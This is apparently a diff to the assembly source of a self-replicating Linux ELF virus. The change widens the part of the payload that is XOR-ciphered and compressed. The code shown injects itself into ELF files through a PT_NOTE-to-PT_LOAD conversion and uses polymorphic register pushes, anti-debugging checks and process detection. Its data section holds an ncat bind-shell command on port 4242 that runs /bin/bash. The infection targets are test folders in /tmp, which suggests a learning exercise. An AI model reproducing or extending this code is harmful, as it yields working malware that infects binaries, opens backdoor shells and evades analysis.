@@ -24,7 +24,7 @@ POLY_push_regs_end:
 
 	; uncipher first part of the code
 	lea rdi, [rel program_entry]			; data = &program_entry
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	mov rsi, obfuscation_begin - program_entry	; size = obfuscation_begin - program_entry
 	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
 	cmp rcx, 0					; if (key_size == 0)
@@ -174,7 +174,7 @@ can_run_infection:
 .end_anti_debugging:
 
 .begin_uncipher:
-	lea rdi, [rel infection_routine]		; data = &infection_routine
+	lea rdi, [rel obfuscation_begin]		; data = &obfuscation_begin
 	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
 	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
@@ -426,14 +426,14 @@ decompression:
 	mov [rdi], rax					; ...
 
 	; Save compressed data for infected
-	lea rsi, [rel infection_routine]		; _src = infection_routine;
+	lea rsi, [rel obfuscation_begin]		; _src = obfuscation_begin;
 	mov rdi, [compressed_data_ptr]			; _dest = compressed_data_ptr;
 	add rdi, COMPRESSION_BUF_SIZE			;  + COMPRESSION_BUF_SIZE
 	sub rdi, [rel compressed_data_size2]		;  - compressed_data_size2
 	mov rcx, [rel compressed_data_size2]		; _count = compressed_data_size2;
 	rep movsb					; memcpy(_dest, _src, _count);
 
-	lea rax, [rel infection_routine]		; cur_src = infection_routine + compressed_data_size2 - 1 ;
+	lea rax, [rel obfuscation_begin]		; cur_src = obfuscation_begin + compressed_data_size2 - 1 ;
 	add rax, [rel compressed_data_size2]		; ...
 	dec rax						; ...
 	mov [cur_src], rax				; ...
@@ -441,7 +441,7 @@ decompression:
 	mov [cur_dest], rax				; ...
 
 .decompression_routine:
-	lea rax, [rel infection_routine]		; while (! (cur_src == infection_routine - 1)) {
+	lea rax, [rel obfuscation_begin]		; while (! (cur_src == obfuscation_begin - 1)) {
 	dec rax						; ...
 	cmp [cur_src], rax				; ...
 	je .end_decompression_routine			; ...
@@ -505,13 +505,18 @@ exit:
 	syscall						; );
 
 ; BEGIN FAKE .data SECTION
+compressed_data_size2: dq 0x00				; Filled in infected
+debugged_message: db "DEBUG DETECTED ;)", 0
+process_message: db "Process detected ;)", 0
+magic_key: db 0x00					; Will be replaced by a script
+magic_key_size: equ $ - magic_key
+fingerprint_int: dd 0
+
+obfuscation_begin:
 infected_folder_1: db "/tmp/test/", 0
 infected_folder_2: db "/tmp/test2/", 0
 elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 len_elf_64_magic: equ $ - elf_64_magic
-compressed_data_size2: dq 0x00				; Filled in infected
-debugged_message: db "DEBUG DETECTED ;)", 0
-process_message: db "Process detected ;)", 0
 dev_null: db "/dev/null", 0
 nc_command: db "/usr/bin/ncat", 0
 nc_arg1: db "ncat", 0
@@ -520,9 +525,6 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0x00					; Will be replaced by a script
-magic_key_size: equ $ - magic_key
-fingerprint_int: dd 0
 poly_push_regs_buffer: db 0x00				; Will be replaced by a script
 poly_push_regs_size: dq 0				; Will be replaced by a script
 poly_push_regs_count: dq 0				; Will be replaced by a script
@@ -823,7 +825,7 @@ treat_file:
 	mov rax, SYS_MMAP				; _ret = mmap(
 	xor rdi, rdi					; 	0,
 	mov rsi, [filesize]				; 	filesize
-	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
+	add rsi, obfuscation_begin - _start		;	  + (obfuscation_begin - _start)
 	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
@@ -876,7 +878,7 @@ treat_file:
 	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
 	mov rsi, [payload_offset]			; payload_offset,
 	mov rdx, [new_vaddr]				; next_vaddr,
-	mov rcx, infection_routine - _start		; (infection_routine - _start)
+	mov rcx, obfuscation_begin - _start		; (obfuscation_begin - _start)
 	add rcx, [compressed_data_size]			;   + compressed_data_size
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
@@ -886,7 +888,7 @@ treat_file:
 	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
 	mov rdi, [fd]					; fd,
 	mov rsi, [filesize]				; filesize
-	add rsi, infection_routine - _start		; + (infection_routine - _start)
+	add rsi, obfuscation_begin - _start		; + (obfuscation_begin - _start)
 	add rsi, [compressed_data_size]			; + compressed_data_size
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
@@ -906,7 +908,7 @@ treat_file:
 							;	_addr,
 	mov rsi, [filesize]				; 	filesize
 	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
-	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
+	add rsi, obfuscation_begin - _start		;	  + (obfuscation_begin - _start)
 	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
@@ -920,18 +922,18 @@ treat_file:
 	add rdi, [filesize]				; _dest += filesize;
 	mov byte [rdi], 0x90				; *_dest = 0x90; //nop instruction
 
-	; copy all bytes between begin and infection_routine to the segment
+	; copy all bytes between begin and obfuscation_begin to the segment
 	mov rdi, [mappedfile]				; _dest = file_map + filesize + 1;
 	add rdi, [filesize]				; ...
 	inc rdi						; ...
 	lea rsi, [rel begin]				; _src = begin;
-	mov rcx, infection_routine - begin		; _len = infection_routine - begin;
+	mov rcx, obfuscation_begin - begin		; _len = obfuscation_begin - begin;
 	rep movsb					; memcpy(_dest, _src, _len);
 
-	; copy all compressed bytes between infection_routine and _end to the segment
+	; copy all compressed bytes between obfuscation_begin and _end to the segment
 	mov rdi, [mappedfile]				; _dest = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, infection_routine - _start		; 	+ (infection_routine - _start);
+	add rdi, obfuscation_begin - _start		; 	+ (obfuscation_begin - _start);
 	mov rsi, [compressed_data_ptr]			; _src = compressed_data_ptr;
 	mov rcx, [compressed_data_size]			; _len = compressed_data_size;
 	rep movsb					; memcpy(_dest, _src, _len);
@@ -1012,10 +1014,10 @@ treat_file:
 	mov rcx, [rel poly_push_regs_size]		; _poly_push_regs_size = poly_push_regs_size;
 	rep movsb					; memcpy(_poly_push_regs_ptr, variation_ptr, _poly_push_regs_size);
 
-	; xor cipher all injected bytes between infection_routine and _end
-	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
+	; xor cipher all injected bytes between obfuscation_begin and _end
+	mov rdi, [mappedfile]				; data = file_map + filesize + (obfuscation_begin - _start);
 	add rdi, [filesize]				;
-	add rdi, infection_routine - _start		;
+	add rdi, obfuscation_begin - _start		;
 	mov rsi, [compressed_data_size]			; size = compressed_data_size
 	mov rdx, [mappedfile]				; key = file_map
 	add rdx, [filesize]				; 	+ filesize
@@ -1023,11 +1025,11 @@ treat_file:
 	mov qword rcx, KEY_BYTE_SIZE			; key_size = KEY_BYTE_SIZE;
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
-	;xor cipher all injected bytes between program_entry and infection_routine
+	;xor cipher all injected bytes between program_entry and obfuscation_begin
 	mov rdi, [mappedfile]				; data = file_map + filesize + (program_entry - _start);
 	add rdi, [filesize]				;
 	add rdi, program_entry - _start			;
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	mov rsi, obfuscation_begin - program_entry	; size = obfuscation_begin - program_entry
 	mov rdx, [mappedfile]				; key = file_map
 	add rdx, [filesize]				; 	+ filesize
 	add rdx, key - _start				; 	+ (key - _start)
@@ -1687,7 +1689,7 @@ compression:
 	mov qword [i_dest], 0			; i_dest = 0;
 
 .begin_compression:				; while (i_src < payload_length) {
-	cmp qword [i_src], _end - infection_routine ; ...
+	cmp qword [i_src], _end - obfuscation_begin ; ...
 	jge .end_compression			; ...
 	xor rdi, rdi				; _i_haystack_limit = 0;
 	mov rax, [i_src]			; if (i_src > 255) {
